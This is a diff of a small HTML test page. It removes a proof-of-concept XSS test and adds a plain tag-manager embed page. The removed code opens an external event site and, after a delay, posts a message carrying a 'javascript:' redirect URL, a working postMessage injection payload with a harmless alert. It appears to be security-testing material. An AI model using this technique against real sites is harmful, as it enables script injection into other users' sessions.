@@ -1,28 +1,20 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+
 <head>
-  <meta charset="UTF-8">
-  <title>Test XSS</title>
+    <meta charset="utf-8">
+    <title>tag-manager.lan</title>
+
 </head>
+
 <body>
+    <h1>Test tag manager</h1>
 
-<button onclick="attack()">Запустить тест</button>
+    
 
-<script>
-function attack() {
-  const target = window.open("https://events.xxx.ru/javajam-2025");
-
-  setTimeout(() => {
-    target.postMessage(JSON.stringify({
-      source: "ak",
-      type: "redirect",
-      data: {
-        url: "javascript:alert('XSS TEST')"
-      }
-    }), "*");
-  }, 3000);
-}
-</script>
-
+            <script src=https://cookiesaver.marketing-platform.devel:27443/form/js/embed_v1.js></script>
+<iframe src="https://cookiesaver.marketing-platform.devel:27443/form?form=aLsr2XHVuJdYGRLP122SSXg8c8cjDhuTEMifGwzW2Rtjzu9KRimnjpvHHDtVxrxb6z11AVijmGiZ8&iframe=1" frameborder="0" name="ak-form-aLsr2XHVuJdYGRLP122SSXg8c8cjDhuTEMifGwzW2Rtjzu9KRimnjpvHHDtVxrxb6z11AVijmGiZ8" class="ak-form" width="100%" sandbox="allow-same-origin allow-forms allow-scripts allow-popups allow-popups-to-escape-sandbox allow-top-navigation"></iframe>
+    
 </body>
+
 </html>
